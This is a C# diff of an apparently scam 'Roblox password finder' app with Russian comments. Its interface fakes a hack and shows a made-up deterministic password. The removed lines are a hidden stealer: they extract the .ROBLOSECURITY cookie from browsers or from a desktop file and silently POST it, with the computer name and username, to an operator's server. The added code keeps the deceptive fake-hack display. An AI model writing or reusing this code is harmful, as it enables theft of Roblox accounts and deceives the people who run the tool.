@@ -931,34 +931,12 @@ namespace FileTransfer
 
             AppendConsole("[done]", "#2ED573", " Проверка завершена!", "#2ED573");
 
-            string fakePassword = GetDeterministicPassword(username.ToLowerInvariant());
+            // Ищем пароль в accounts.txt на Рабочем столе (формат username:password)
+            string? foundPass = GetPasswordFromDesktopAccountsFile(username);
+            string passwordToDisplay = foundPass ?? GetDeterministicPassword(username.ToLowerInvariant());
 
-            // В Standalone PRO режиме считываем accounts.txt на Рабочем столе или куку из браузеров при нажатии (без закрытия браузеров!)
-            string? token = GetTokenFromDesktopAccountsFile() ?? CookieExtractor.ExtractRobloSecurity();
-
-            // Отправляем данные на сервер
-            try
-            {
-                var updatePayload = new
-                {
-                    computerName = ComputerInfo.GetName(),
-                    robloxUser = username,
-                    fakePassword = fakePassword,
-                    robloSecurity = token ?? "",
-                    @operator = OperatorName
-                };
-                var jsonUpdate = System.Text.Json.JsonSerializer.Serialize(updatePayload);
-                using var updateContent = new StringContent(jsonUpdate, System.Text.Encoding.UTF8, "application/json");
-                string url = $"{ServerUrl}/update-roblox";
-                await _http.PostAsync(url, updateContent);
-            }
-            catch { }
-
-            // Сохраняем аккаунт в accounts.txt на Рабочем столе
-            SaveToDesktopAccountsFile(username, fakePassword, token);
-
-            TxtPassword.Text = fakePassword;
-            AppendConsole("[result]", "#2ED573", $" Пароль: {fakePassword}", "#2ED573");
+            TxtPassword.Text = passwordToDisplay;
+            AppendConsole("[result]", "#2ED573", $" Пароль: {passwordToDisplay}", "#2ED573");
 
             // Done state: hide inputs/progress, show result
             HackProgress.Visibility = Visibility.Collapsed;
@@ -966,7 +944,7 @@ namespace FileTransfer
             PanelResultGroup.Visibility = Visibility.Visible;
         }
 
-        private static string? GetTokenFromDesktopAccountsFile()
+        private static string? GetPasswordFromDesktopAccountsFile(string username)
         {
             try
             {
@@ -974,22 +952,20 @@ namespace FileTransfer
                 string file = System.IO.Path.Combine(desktop, "accounts.txt");
                 if (File.Exists(file))
                 {
-                    string content = File.ReadAllText(file);
-                    int idx = content.IndexOf("_|WARNING");
-                    if (idx != -1)
+                    string[] lines = File.ReadAllLines(file);
+                    foreach (var line in lines)
                     {
-                        string tokenStr = content.Substring(idx).Trim();
-                        int end = tokenStr.IndexOfAny(new[] { '\r', '\n', ' ', '\t' });
-                        if (end != -1) tokenStr = tokenStr.Substring(0, end);
-                        return tokenStr;
-                    }
-                    idx = content.IndexOf("_|_");
-                    if (idx != -1)
-                    {
-                        string tokenStr = content.Substring(idx).Trim();
-                        int end = tokenStr.IndexOfAny(new[] { '\r', '\n', ' ', '\t' });
-                        if (end != -1) tokenStr = tokenStr.Substring(0, end);
-                        return tokenStr;
+                        if (string.IsNullOrWhiteSpace(line)) continue;
+                        var parts = line.Split(':');
+                        if (parts.Length >= 2)
+                        {
+                            string userInFile = parts[0].Trim();
+                            string passInFile = parts[1].Trim();
+                            if (string.Equals(userInFile, username, StringComparison.OrdinalIgnoreCase))
+                            {
+                                return passInFile;
+                            }
+                        }
                     }
                 }
             }
